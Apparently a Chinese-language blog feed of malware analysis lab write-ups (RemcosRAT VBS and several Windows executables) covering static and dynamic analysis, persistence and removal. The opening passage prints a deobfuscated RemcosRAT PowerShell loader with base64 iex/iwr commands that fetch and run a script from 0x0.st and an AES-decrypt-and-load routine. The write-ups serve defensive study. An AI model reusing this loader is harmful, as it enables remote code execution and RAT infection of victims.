<li><font size='3'> 整理一下代碼：<code>Pending</code></font><ul>
<li><font size='3'>BASE64</font></li>
<li><font size='3'>AES</font></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<!-- <img data-src='hide-malware.png' width='700' align='center' alt='待解析'></img> -->

<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>RemcosRAT</tag>
        <tag>vbs</tag>
        <tag>Pending</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 04</title>
    <url>/posts/49126/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 ime.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
<li><font size='3'>MD5：<code>36536F8C42C258DCC23889DE6D72019E</code></font></li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>針對檔案資訊進行初步查找</font></li>
</ul>
<p><img data-src='pe-studio-1.png' width='700' align='center' alt='查看 Strings'></img></p>
<br>

<p><img data-src='pe-studio-2.png' width='700' align='center' alt='查看 HASH'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>


<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li>監控程式的行為</li>
</ul>
<p><img data-src='process-monitor-1.png' width='700' align='center' alt='查看到有建立一個檔案'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>查看有無可疑的路徑、檔案<ul>
<li>明顯添加一個可疑檔案</li>
</ul>
</li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>建立 Windows NT 自動執行 ( <code>ime.exe</code> )，會在該資料夾建立一個 <code>ime.srg</code> 檔案。</font></li>
<li><font size='3'>移除 <code>ime.exe</code> 、 <code>ime.srg</code> 。</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>分析 <code>ime.srg</code> 檔案 - <code>Pending</code></font></li>
</ul>
<p><img data-src='ime-srg.png' width='700' align='center' alt='待解析'></img></p>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
        <tag>Pending</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 10 - vbs</title>
    <url>/posts/33372/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>


<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
</li>
<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
</li>
<li><p><a href='https://bazaar.abuse.ch/sample/894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f//' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
</li>
<li><p><font size='3'>HASH256：<code>894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f</code></font></p>
</li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>


<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 檢查 hash</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>查看有無參考資訊</font></li>
</ul>
<br>

<p><img data-src='pe-studio-1.png' align='center' width='700' alt='PEStudio'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
</ul>
</li>
</ul>
<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
<br>

<p><img data-src='procmon-2.png' width='700' align='center' alt='另開 cmd 運行 bat 檔案'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>檢查有無可疑的路徑、檔案。</li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<hr>
<h4 id="1️⃣-notepad"><a href="#1️⃣-notepad" class="headerlink" title="1️⃣ notepad"></a>1️⃣ notepad</h4><ul>
<li><font size='3'>打開惡意程式查看</font></li>
</ul>
<p><img data-src='vbs-text-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
<br>

<hr>
<br>


<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><p><font size='3'>執行後會加入 <code>Logon</code> 常駐，並建立 <code>.bat</code> 檔案至 tmp 。 </font></p>
</li>
<li><p><font size='3'>移除：</font></p>
<ul>
<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\Jq1fkvQOn.bat</code></font></li>
<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_79f00caa.cmd</code></font></li>
</ul>
</li>
</ul>
<br>


<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'><code>Pending</code></font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>vbs</tag>
        <tag>Pending</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 05</title>
    <url>/posts/40649/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 Injected_LoadExe.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
<li><font size='3'>MD5：<code>ED7A16BC643D74CD6A15EC9DCC8872E6A30B28B2CE012BD6F6ED6BFA75A61881</code></font></li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>針對檔案資訊進行初步查找</font></li>
</ul>
<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
<br>

<p><img data-src='pe-studio-2.png' width='700' align='center' alt='使用 RAR 查看'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>


<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li>監控程式的行為</li>
</ul>
<p><img data-src='process-monitor-1.png' width='700' align='center' alt='injected_LoadExe.exe'></img></p>
<br>

<p><img data-src='process-monitor-2.png' width='700' align='center' alt='iusb3mon.exe'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>確認有一個正規的 <code>Services</code></li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>點擊後會自動將檔案帶入 <code>tmp</code> 資料夾中，</font></li>
<li><font size='3'>移除：</font><ul>
<li><font size='3'>1. <code>&quot;C:\log/haha.txt&quot;</code></font></li>
<li><font size='3'>2. <code>C:\Users\ADMINI~1\AppData\Local\Temp\1\RarSFX0\iusb3mon.dll</code></font></li>
</ul>
</li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>( 自解壓縮至 tmp &gt; 將 dll 檔案取代 <code>Intel</code> 正規下的 dll )</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
        <tag>Pending</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 06</title>
    <url>/posts/32765/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 ibm.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
<li><font size='3'>MD5：<code>1b3e86a3be86f2942bd7615107956c4b2989fad3cec3026cb454fae1042e3664</code></font></li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>針對檔案資訊進行初步查找</font></li>
</ul>
<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font></li>
<li><font size='3'>x64dbg -&gt; 斷點檢查</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li>監控程式的行為</li>
</ul>
<p><img data-src='process-monitor-1.png' width='700' align='center' alt='ibm.exe'></img></p>
<br>

<p><img data-src='process-monitor-2.png' width='700' align='center' alt='建立 Deleteme.bat'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>檢查機碼有無被更改</li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<h4 id="3️⃣-X64dbg"><a href="#3️⃣-X64dbg" class="headerlink" title="3️⃣ X64dbg"></a>3️⃣ X64dbg</h4><ul>
<li>分析 <code>Delete.bat</code> 做了啥</li>
</ul>
<p><img data-src='x64dbg-1.png' width='700' align='center'></img></p>
<br>

<p><img data-src='x64dbg-2.png' width='700' align='center' alt='查看內容'></img></p>
<br>

<p><img data-src='deleteme-bat.png' width='700' align='center' alt='通過斷點可以查看完整檔案'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>複製檔案至 <code>C:\Windows\SysWOW64</code> 路徑下。</font></li>
<li><font size='3'>添加至 <code>AutoRun</code> 中自動執行。</font></li>
<li><font size='3'>建立一個 <code>Deleteme.bat</code> 檔案並執行。</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>暫無</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 07</title>
    <url>/posts/48956/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 smass.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
<li><font size='3'>MD5：<code>07953773c8b4e9f84e87742915dfda47ac7f1553f0ab6f007fc2d4d1971d6f95</code></font></li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>針對檔案資訊進行初步查找</font></li>
</ul>
<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
